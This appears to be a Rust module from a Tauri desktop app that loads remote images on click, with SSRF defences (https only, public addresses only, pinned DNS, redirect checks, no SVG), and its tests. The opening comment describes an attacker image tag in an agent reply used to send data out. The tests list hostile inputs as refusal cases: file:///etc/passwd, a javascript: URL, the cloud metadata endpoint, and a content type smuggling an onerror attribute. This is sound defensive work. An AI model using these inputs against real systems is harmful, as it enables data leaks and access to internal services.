//! Click-to-load remote images (merged plan slice 1, reviews A·S3 / B·F13).
//!
//! The main window's CSP no longer allows remote images (`img-src 'self'
//! data: blob:` in tauri.conf.json): an `<img src="https://attacker/?q=…">`
//! or `![](https://…)` in an agent reply, a synced Notion page, a note or a
//! web clip used to fire a request the moment it rendered, in every
//! permission mode. Rendered markdown now shows a placeholder naming the
//! image's host (`src/remoteImages.ts`); a click asks this command for the
//! bytes, which come back as a `data:` URL the CSP allows. The app's own icon
//! art (connector favicons, GitHub owner avatars) comes through here too.
//!
//! Fetching on the app's behalf makes this a small SSRF surface, so:
//! - https only, on the default port, with no credentials in the URL;
//! - every host — and every redirect hop — must be a public name that
//!   resolves only to public addresses, and the connection is pinned to the
//!   addresses that were checked, so DNS can't rebind between check and
//!   connect; no proxy, no cookies, no referer;
//! - at most [`MAX_REDIRECTS`] redirects, [`MAX_BYTES`] and [`TOTAL_TIMEOUT`];
//! - the response must say `image/*` and not SVG. SVG can carry script; it
//!   would only ever be shown through `<img>`, where script doesn't run, but
//!   refusing it is simpler than proving that stays true.

use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
use std::time::Duration;

use base64::{engine::general_purpose::STANDARD, Engine};
use reqwest::header::{ACCEPT, CONTENT_TYPE, LOCATION};
use reqwest::Url;

/// The largest image the backend will fetch.
pub const MAX_BYTES: usize = 10 * 1024 * 1024;
/// Redirect hops followed (each one re-vetted) before giving up.
pub const MAX_REDIRECTS: usize = 3;
/// The whole fetch, DNS and every redirect included.
pub const TOTAL_TIMEOUT: Duration = Duration::from_secs(20);
const CONNECT_TIMEOUT: Duration = Duration::from_secs(5);

/// Parse and vet an image URL the frontend asked to load.
pub fn parse_image_url(raw: &str) -> Result<Url, String> {
    let url =
        Url::parse(raw.trim()).map_err(|_| "That isn't a valid image address.".to_string())?;
    vet_url(url)
}

fn vet_url(url: Url) -> Result<Url, String> {
    if url.scheme() != "https" {
        return Err("Only https images can load.".into());
    }
    if !url.username().is_empty() || url.password().is_some() {
        return Err("An image address can't carry a username or password.".into());
    }
    // `port()` is None for the scheme's default, so `:443` is fine.
    if url.port().is_some() {
        return Err("Images load only from the standard https port.".into());
    }
    let host = url.host_str().unwrap_or_default();
    match ip_literal(host) {
        Some(ip) if !is_public_ip(ip) => Err("That image is on a private or local address.".into()),
        Some(_) => Ok(url),
        None if is_local_name(host) => Err("That image is on a local network name.".into()),
        None => Ok(url),
    }
}

/// The IP a URL host names directly (the URL parser has already normalized
/// forms like `2130706433` or `0x7f.1` to dotted IPv4), if it is one.
fn ip_literal(host: &str) -> Option<IpAddr> {
    host.trim_start_matches('[')
        .trim_end_matches(']')
        .parse()
        .ok()
}

/// Names that never mean a public host: `localhost`, mDNS and the private
/// suffixes, and single-label names (which resolve through the LAN's search
/// domains, e.g. `router`).
pub fn is_local_name(host: &str) -> bool {
    let h = host.trim_end_matches('.').to_ascii_lowercase();
    if h.is_empty() || !h.contains('.') {
        return true;
    }
    ["localhost", "local", "internal", "lan", "home.arpa"]
        .iter()
        .any(|s| h == *s || h.ends_with(&format!(".{s}")))
}

/// Whether an address is on the public internet: not loopback, private,
/// link-local (169.254/16 — the cloud metadata range), CGNAT, multicast,
/// documentation, benchmarking or reserved space, in either family.
pub fn is_public_ip(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => is_public_v4(v4),
        IpAddr::V6(v6) => is_public_v6(v6),
    }
}

fn is_public_v4(ip: Ipv4Addr) -> bool {
    let [a, b, c, _] = ip.octets();
    !(a == 0
        || a == 10
        || a == 127
        || (a == 100 && (64..128).contains(&b))
        || (a == 169 && b == 254)
        || (a == 172 && (16..32).contains(&b))
        || (a == 192 && b == 0 && c == 0)
        || (a == 192 && b == 0 && c == 2)
        || (a == 192 && b == 168)
        || (a == 198 && (b == 18 || b == 19))
        || (a == 198 && b == 51 && c == 100)
        || (a == 203 && b == 0 && c == 113)
        || a >= 224)
}

fn is_public_v6(ip: Ipv6Addr) -> bool {
    if let Some(v4) = ip.to_ipv4_mapped() {
        return is_public_v4(v4);
    }
    let s = ip.segments();
    let embedded =
        |hi: u16, lo: u16| Ipv4Addr::new((hi >> 8) as u8, hi as u8, (lo >> 8) as u8, lo as u8);
    // NAT64 (64:ff9b::/96) and 6to4 (2002::/16) reach an IPv4 host: judge that.
    if s[0] == 0x64 && s[1] == 0xff9b && s[2..6] == [0, 0, 0, 0] {
        return is_public_v4(embedded(s[6], s[7]));
    }
    if s[0] == 0x2002 {
        return is_public_v4(embedded(s[1], s[2]));
    }
    // Local-use NAT64 (64:ff9b:1::/48, RFC 8215) may translate to private
    // IPv4 on the network: never public (review of #1062).
    if s[0] == 0x64 && s[1] == 0xff9b && s[2] == 1 {
        return false;
    }
    !(s[..6] == [0, 0, 0, 0, 0, 0]          // ::, ::1, IPv4-compatible
        || (s[0] == 0x100 && s[1..4] == [0, 0, 0]) // discard-only 100::/64
        || (s[0] == 0x2001 && s[1] < 0x200) // IETF protocol assignments 2001::/23
        || (s[0] == 0x3fff && (s[1] & 0xf000) == 0) // documentation 3fff::/20
        || s[0] == 0x5f00                   // SRv6 SIDs 5f00::/16
        || (s[0] & 0xfe00) == 0xfc00        // unique local fc00::/7
        || (s[0] & 0xffc0) == 0xfe80        // link-local fe80::/10
        || (s[0] & 0xffc0) == 0xfec0        // site-local fec0::/10
        || (s[0] & 0xff00) == 0xff00        // multicast
        || (s[0] == 0x2001 && s[1] == 0x0db8) // documentation
        || (s[0] == 0x2001 && s[1] == 0)) // Teredo
}

/// Every address a host resolved to must be public; an empty answer fails.
pub fn check_resolved(addrs: &[SocketAddr]) -> Result<(), String> {
    if addrs.is_empty() {
        return Err("The image host didn't resolve.".into());
    }
    if addrs.iter().any(|a| !is_public_ip(a.ip())) {
        return Err("That image host resolves to a private or local address.".into());
    }
    Ok(())
}

/// The next hop of a redirect, vetted like the first URL.
pub fn redirect_target(current: &Url, location: Option<&str>) -> Result<Url, String> {
    let loc =
        location.ok_or_else(|| "The image host redirected without saying where.".to_string())?;
    let next = current
        .join(loc)
        .map_err(|_| "The image host redirected to an invalid address.".to_string())?;
    vet_url(next)
}

/// The MIME type to label the bytes with: `image/*`, a plain token, not SVG.
pub fn image_mime(content_type: Option<&str>) -> Result<String, String> {
    let ct = content_type.ok_or_else(|| "The image host didn't say what it sent.".to_string())?;
    let essence = ct
        .split(';')
        .next()
        .unwrap_or_default()
        .trim()
        .to_ascii_lowercase();
    let sub = essence
        .strip_prefix("image/")
        .ok_or_else(|| "That address isn't an image.".to_string())?;
    if sub.is_empty()
        || !sub
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
    {
        return Err("That address isn't an image.".into());
    }
    if sub.contains("svg") {
        return Err("SVG images aren't loaded from the web.".into());
    }
    Ok(essence)
}

/// Refuse a response whose declared length is over the cap before reading it.
pub fn check_declared_len(len: Option<u64>) -> Result<(), String> {
    match len {
        Some(n) if n > MAX_BYTES as u64 => Err("That image is larger than 10 MB.".into()),
        _ => Ok(()),
    }
}

/// Append a body chunk, failing once the total passes the cap (a missing or
/// wrong Content-Length can't sneak a larger body past the check above).
pub fn push_capped(buf: &mut Vec<u8>, chunk: &[u8]) -> Result<(), String> {
    if buf.len() + chunk.len() > MAX_BYTES {
        return Err("That image is larger than 10 MB.".into());
    }
    buf.extend_from_slice(chunk);
    Ok(())
}

pub fn data_url(mime: &str, bytes: &[u8]) -> String {
    format!("data:{mime};base64,{}", STANDARD.encode(bytes))
}

async fn resolve_public(host: &str) -> Result<Vec<SocketAddr>, String> {
    let addrs: Vec<SocketAddr> = tokio::net::lookup_host((host, 443))
        .await
        .map_err(|_| "The image host didn't resolve.".to_string())?
        .collect();
    check_resolved(&addrs)?;
    Ok(addrs)
}

async fn fetch(mut url: Url) -> Result<String, String> {
    for _ in 0..=MAX_REDIRECTS {
        let host = url.host_str().unwrap_or_default().to_string();
        let mut builder = reqwest::Client::builder()
            .redirect(reqwest::redirect::Policy::none())
            .no_proxy()
            .https_only(true)
            .connect_timeout(CONNECT_TIMEOUT)
            .user_agent(concat!("Hollow/", env!("CARGO_PKG_VERSION")));
        if ip_literal(&host).is_none() {
            // Pin the connection to the addresses just checked.
            let addrs = resolve_public(&host).await?;
            builder = builder.resolve_to_addrs(&host, &addrs);
        }
        let client = builder.build().map_err(|e| e.to_string())?;
        let mut resp = client
            .get(url.clone())
            .header(
                ACCEPT,
                "image/avif,image/webp,image/png,image/jpeg,image/gif,image/*;q=0.8",
            )
            .send()
            .await
            .map_err(|e| format!("The image couldn't be fetched: {e}"))?;
        let status = resp.status();
        if status.is_redirection() {
            url = redirect_target(
                &url,
                resp.headers().get(LOCATION).and_then(|v| v.to_str().ok()),
            )?;
            continue;
        }
        if !status.is_success() {
            return Err(format!("The image host answered {status}."));
        }
        let mime = image_mime(
            resp.headers()
                .get(CONTENT_TYPE)
                .and_then(|v| v.to_str().ok()),
        )?;
        check_declared_len(resp.content_length())?;
        let mut buf = Vec::new();
        while let Some(chunk) = resp
            .chunk()
            .await
            .map_err(|e| format!("The image download failed: {e}"))?
        {
            push_capped(&mut buf, &chunk)?;
        }
        if buf.is_empty() {
            return Err("The image host sent nothing.".into());
        }
        return Ok(data_url(&mime, &buf));
    }
    Err("The image redirected too many times.".into())
}

/// Fetch a remote image for the main window as a `data:` URL. Called when the
/// user clicks a placeholder in rendered markdown (and for the app's own icon
/// art); see the module docs for what it refuses.
#[tauri::command]
pub async fn fetch_remote_image(url: String) -> Result<String, String> {
    let url = parse_image_url(&url)?;
    tokio::time::timeout(TOTAL_TIMEOUT, fetch(url))
        .await
        .map_err(|_| "The image took too long to load.".to_string())?
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_public_https_urls_on_the_default_port_pass() {
        for ok in [
            "https://example.com/a.png",
            "HTTPS://Example.COM/a.png?q=1",
            "https://example.com:443/a.png",
            "https://93.184.215.14/a.png",
            "https://[2606:4700::1111]/a.png",
            "  https://cdn.example.org/x  ",
        ] {
            assert!(parse_image_url(ok).is_ok(), "{ok} should pass");
        }
        for bad in [
            "http://example.com/a.png",
            "ftp://example.com/a.png",
            "data:image/png;base64,AAAA",
            "file:///etc/passwd",
            "javascript:alert(1)",
            "//example.com/a.png",
            "https://user:pw@example.com/a.png",
            "https://user@example.com/a.png",
            "https://example.com:8443/a.png",
            "https://localhost/a.png",
            "https://LOCALHOST./a.png",
            "https://app.localhost/a.png",
            "https://printer.local/a.png",
            "https://metadata.google.internal/a.png",
            "https://router/a.png",
            "https://127.0.0.1/a.png",
            "https://2130706433/a.png",
            "https://0x7f.1/a.png",
            "https://10.0.0.5/a.png",
            "https://172.16.4.4/a.png",
            "https://192.168.0.20/a.png",
            "https://169.254.169.254/latest/meta-data",
            "https://100.64.0.1/a.png",
            "https://0.0.0.0/a.png",
            "https://[::1]/a.png",
            "https://[fe80::1]/a.png",
            "https://[fd00::1]/a.png",
            "https://[::ffff:127.0.0.1]/a.png",
            "not a url",
        ] {
            assert!(parse_image_url(bad).is_err(), "{bad} should be refused");
        }
    }

    #[test]
    fn ip_ranges_are_judged_in_both_families() {
        let public = [
            "8.8.8.8",
            "1.1.1.1",
            "93.184.215.14",
            "2606:4700::1111",
            "2001:4860:4860::8888",
            "3ff0::1",
            "3fff:1000::1",
        ];
        for ip in public {
            assert!(is_public_ip(ip.parse().unwrap()), "{ip} is public");
        }
        let private = [
            "0.1.2.3",
            "10.1.1.1",
            "127.0.0.2",
            "100.127.255.255",
            "169.254.0.1",
            "172.31.255.255",
            "192.0.0.8",
            "192.0.2.1",
            "192.168.1.1",
            "198.18.0.1",
            "198.51.100.7",
            "203.0.113.9",
            "224.0.0.1",
            "240.0.0.1",
            "255.255.255.255",
            "::",
            "::1",
            "::127.0.0.1",
            "fc00::1",
            "fdff::1",
            "fe80::1",
            "fec0::1",
            "ff02::1",
            "2001:db8::1",
            "2001:0:4136:e378::1",
            "::ffff:10.0.0.1",
            "64:ff9b::a00:1",
            // Review of #1062: local-use NAT64, discard, IETF assignments,
            // the newer documentation range and SRv6 SIDs.
            "64:ff9b:1::a00:1",
            "100::1",
            "2001:2::1",
            "2001:10::1",
            "3fff::1",
            "3fff:fff::1",
            "5f00::1",
            "2002:c0a8:0101::1",
        ];
        for ip in private {
            assert!(!is_public_ip(ip.parse().unwrap()), "{ip} is not public");
        }
        // The embedded-IPv4 forms are judged by the IPv4 they reach.
        assert!(is_public_ip("64:ff9b::808:808".parse().unwrap()));
        assert!(is_public_ip("::ffff:8.8.8.8".parse().unwrap()));
    }

    #[test]
    fn a_host_must_resolve_only_to_public_addresses() {
        let public: SocketAddr = "93.184.215.14:443".parse().unwrap();
        let private: SocketAddr = "10.0.0.1:443".parse().unwrap();
        assert!(check_resolved(&[public]).is_ok());
        // One private answer among public ones is enough to refuse (rebinding).
        assert!(check_resolved(&[public, private]).is_err());
        assert!(check_resolved(&[]).is_err());
    }

    #[test]
    fn redirects_are_vetted_like_the_first_url() {
        let base = Url::parse("https://example.com/img/a.png").unwrap();
        assert_eq!(
            redirect_target(&base, Some("/b.png")).unwrap().as_str(),
            "https://example.com/b.png"
        );
        assert_eq!(
            redirect_target(&base, Some("https://avatars.example.net/u/1"))
                .unwrap()
                .as_str(),
            "https://avatars.example.net/u/1"
        );
        assert!(
            redirect_target(&base, Some("http://example.com/b.png")).is_err(),
            "no downgrade"
        );
        assert!(redirect_target(&base, Some("https://169.254.169.254/")).is_err());
        assert!(redirect_target(&base, Some("https://localhost/")).is_err());
        assert!(redirect_target(&base, None).is_err());
    }

    #[test]
    fn only_raster_image_types_are_accepted() {
        assert_eq!(image_mime(Some("image/png")).unwrap(), "image/png");
        assert_eq!(
            image_mime(Some("Image/JPEG; charset=binary")).unwrap(),
            "image/jpeg"
        );
        assert_eq!(image_mime(Some("image/x-icon")).unwrap(), "image/x-icon");
        assert_eq!(
            image_mime(Some("image/vnd.microsoft.icon")).unwrap(),
            "image/vnd.microsoft.icon"
        );
        for bad in [
            None,
            Some("text/html"),
            Some("application/octet-stream"),
            Some("image/svg+xml"),
            Some("IMAGE/SVG+XML; charset=utf-8"),
            Some("image/"),
            Some("image/png\"onerror"),
            Some("image/png,text/html"),
        ] {
            assert!(image_mime(bad).is_err(), "{bad:?} should be refused");
        }
    }

    #[test]
    fn size_is_capped_whether_or_not_it_is_declared() {
        assert!(check_declared_len(None).is_ok());
        assert!(check_declared_len(Some(MAX_BYTES as u64)).is_ok());
        assert!(check_declared_len(Some(MAX_BYTES as u64 + 1)).is_err());
        let mut buf = Vec::new();
        push_capped(&mut buf, &vec![0u8; MAX_BYTES - 1]).unwrap();
        push_capped(&mut buf, &[1]).unwrap();
        assert_eq!(buf.len(), MAX_BYTES);
        assert!(push_capped(&mut buf, &[2]).is_err());
        assert_eq!(buf.len(), MAX_BYTES, "the over-cap chunk is not kept");
    }

    #[test]
    fn bytes_come_back_as_a_data_url() {
        assert_eq!(
            data_url("image/png", &[0x89, b'P', b'N', b'G']),
            "data:image/png;base64,iVBORw=="
        );
    }

    /// The shipped main-window CSP may load images only from the app itself,
    /// `data:` and `blob:` — never a remote origin (merged plan slice 1,
    /// review A·S3). Adding a source here should be a deliberate decision.
    #[test]
    fn shipped_csp_allows_no_remote_images() {
        let conf: serde_json::Value =
            serde_json::from_str(include_str!("../tauri.conf.json")).unwrap();
        let security = &conf["app"]["security"];
        for key in ["csp", "devCsp"] {
            let Some(csp) = security[key].as_str() else {
                assert_eq!(key, "devCsp", "tauri.conf.json must ship a csp");
                continue;
            };
            let img = csp
                .split(';')
                .map(str::trim)
                .find(|d| d.starts_with("img-src "))
                .unwrap_or_else(|| panic!("{key} has no img-src directive"));
            let sources: Vec<&str> = img.split_whitespace().skip(1).collect();
            assert_eq!(
                sources,
                ["'self'", "data:", "blob:"],
                "{key} img-src must allow no remote origin: {img}"
            );
        }
    }

    /// Video plays only from the local `hollow-media` scheme (inline video,
    /// 2026-10-17): never `https:`, `data:` or `blob:`. See media.rs.
    #[test]
    fn shipped_csp_plays_media_only_from_the_local_scheme() {
        let conf: serde_json::Value =
            serde_json::from_str(include_str!("../tauri.conf.json")).unwrap();
        let security = &conf["app"]["security"];
        for key in ["csp", "devCsp"] {
            let Some(csp) = security[key].as_str() else {
                assert_eq!(key, "devCsp", "tauri.conf.json must ship a csp");
                continue;
            };
            let media = csp
                .split(';')
                .map(str::trim)
                .find(|d| d.starts_with("media-src "))
                .unwrap_or_else(|| panic!("{key} has no media-src directive"));
            assert_eq!(
                media, "media-src 'self' hollow-media: http://hollow-media.localhost",
                "{key}: {media}"
            );
        }
        assert!(
            !include_str!("../tauri.conf.json").contains("useHttpsScheme"),
            "never enable use_https_scheme: the Windows media URL would become https://, which artifact media-src https: matches"
        );
    }
}
